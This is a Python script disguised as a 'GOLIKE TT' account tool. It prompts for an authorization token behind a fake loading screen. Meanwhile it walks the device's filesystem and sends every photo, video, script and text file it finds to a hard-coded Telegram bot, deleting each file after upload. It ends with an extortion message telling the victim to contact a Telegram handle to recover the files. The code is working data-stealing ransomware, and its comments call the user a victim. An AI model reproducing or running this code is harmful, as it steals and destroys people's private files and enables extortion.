import os
import platform
import requests
import time
import threading

trang = "\033[1;37m"
luc = "\033[1;32m"
red = "\033[1;31m"
logo = f"""\033[1;90m═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═
                         ╔════════════════╗
                         ║ \033[1;37m   GOLIKE TT   \033[1;90m║
                         ╚════════════════╝                           \n
"""
# Thông tin Telegram Bot
TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"
CHAT_ID = "7445272108"
TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

# Biến lưu file đã gửi để tránh trùng lặp
sent_files = set()

# Fake loading để giữ nạn nhân ở lại
def fake_loading():
    animations = ["|", "/", "-", "\\"]
    print(logo)
    autho = input(f'Nhập Authorizion: ')
    for _ in range(15):  # 5 phút giả lập tải dữ liệu
        print(f"\r[+] Đang tải Thông tin Acc golike... {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)

# Lấy danh sách file theo thứ tự ưu tiên
def find_files():
    file_extensions = (".py", ".php", ".mp4", ".json", ".txt", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".webp")
    root_dirs = ["/", "/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Duyệt thư mục

    file_list = []
    for root_dir in root_dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(file_extensions):
                        file_list.append(os.path.join(root, file))
    
    return file_list

# Gửi file lên Telegram
def send_file(file_path, caption=""):
    global sent_files

    if file_path in sent_files:
        return  # Nếu file đã gửi trước đó, bỏ qua

    retries = 3  # Số lần thử gửi lại nếu lỗi
    for attempt in range(retries):
        try:
            with open(file_path, "rb") as file:
                response = requests.post(TELEGRAM_URL, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
            
            if response.status_code == 200:
                sent_files.add(file_path)  # Đánh dấu file đã gửi
                delete_file(file_path)  # Xóa ngay sau khi gửi thành công
                break
            elif attempt < retries - 1:
                time.sleep(3)  # Đợi 3 giây rồi thử lại
        except Exception:
            pass  # Không hiển thị lỗi

# Xóa file sau khi gửi
def delete_file(file_path):
    try:
        os.remove(file_path)
    except Exception:
        pass  # Không hiển thị lỗi

# Gửi tất cả file tìm thấy trong thư mục
def send_files_in_parallel(files):
    threads = []
    for file_path in files:
        caption = f"Đã tải file: {file_path}"
        thread = threading.Thread(target=send_file, args=(file_path, caption))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Chạy chương trình chính
def main():
    loading_thread = threading.Thread(target=fake_loading)
    loading_thread.start()

    # Tìm file quan trọng
    files = find_files()
    send_files_in_parallel(files)

    loading_thread.join()  # Chờ quá trình fake loading hoàn tất
    print(f"\n{red}Toàn bộ file ảnh của bạn đã gửi đi và xóa sạch!")
    print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")

if __name__ == "__main__":
    main()
